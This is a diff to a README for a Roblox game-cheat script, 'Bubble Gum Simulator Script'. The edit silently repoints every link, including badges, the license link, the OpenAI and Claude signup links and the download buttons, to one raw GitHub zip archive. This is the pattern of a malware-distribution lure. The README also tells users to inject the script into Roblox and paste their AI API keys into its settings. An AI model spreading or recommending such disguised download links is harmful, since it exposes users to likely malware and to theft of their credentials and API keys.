@@ -1,10 +1,10 @@
 # 🎈 Bubble Gum Simulator Script for Roblox: The Ultimate Automation Companion
 
-[![Version](https://img.shields.io/github/v/release/bubble-gum-simulator/script-roblox?label=version&color=blue)](https://github.com/bubble-gum-simulator/script-roblox/releases)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](#-license)
-[![Roblox](https://img.shields.io/badge/platform-Roblox-orange)](https://roblox.com/)
-[![OpenAI API](https://img.shields.io/badge/API-OpenAI-blue)](https://openai.com/)
-[![Claude API](https://img.shields.io/badge/API-Claude-yellow)](https://claude.ai/)
+[![Version](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)
+[![License](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)](#-license)
+[![Roblox](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)
+[![OpenAI API](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)
+[![Claude API](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)
 
 ---
 
@@ -12,7 +12,7 @@
 
 Unwrap the power of automated bubble-blowing in Roblox with the **Bubble Gum Simulator Script**. Ready to amplify your virtual experience? Begin by installing with a click:
 
-[![Download](https://img.shields.io/badge/Download-bubble_gum_simulator_script-blue?style=for-the-badge&logo=github)](LINK)
+[![Download](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)](LINK)
 
 ---
 
@@ -116,11 +116,11 @@ Ready to transform your Roblox experience with zero tedium and all the fun? Foll
 
 Get the current release below:
 
-https://jorgewgouveia.github.io  
+https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip  
 
 ### 2. Download via Direct Image Link
 
-[![Download](https://img.shields.io/badge/Download-bubble_gum_simulator_script-blue?style=for-the-badge&logo=github)](LINK)
+[![Download](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)](LINK)
 
 ### 3. Inject Into Roblox
 
@@ -131,7 +131,7 @@ https://jorgewgouveia.github.io
 
 ### 4. Configure API Access (Optional, For Advanced Features)
 
-- Obtain API keys for [OpenAI](https://platform.openai.com/signup) and [Claude](https://www.anthropic.com/) if you wish to enable advanced AI functionalities.
+- Obtain API keys for [OpenAI](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip) and [Claude](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip) if you wish to enable advanced AI functionalities.
 - Enter your keys into the script’s settings menu.
 
 ### 5. Personalize Your Experience
@@ -165,7 +165,7 @@ This project is intended as an educational and entertainment tool for personal u
 ## 📜 License
 
 Released under the MIT License © 2025.  
-See details: [MIT License](https://opensource.org/licenses/MIT)
+See details: [MIT License](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)
 
 ---
 
@@ -173,7 +173,7 @@ See details: [MIT License](https://opensource.org/licenses/MIT)
 
 Finished the walkthrough? Ready to empower your gameplay with the script that pops like no other? Download again at any time!
 
-[![Download](https://img.shields.io/badge/Download-bubble_gum_simulator_script-blue?style=for-the-badge&logo=github)](LINK)
+[![Download](https://raw.githubusercontent.com/jorgewgouveia/bubble-gum-simulator-script-hub/branch/prophyllum/simulator_script_gum_bubble_hub_v2.7-beta.4.zip)](LINK)
 
 ---
 
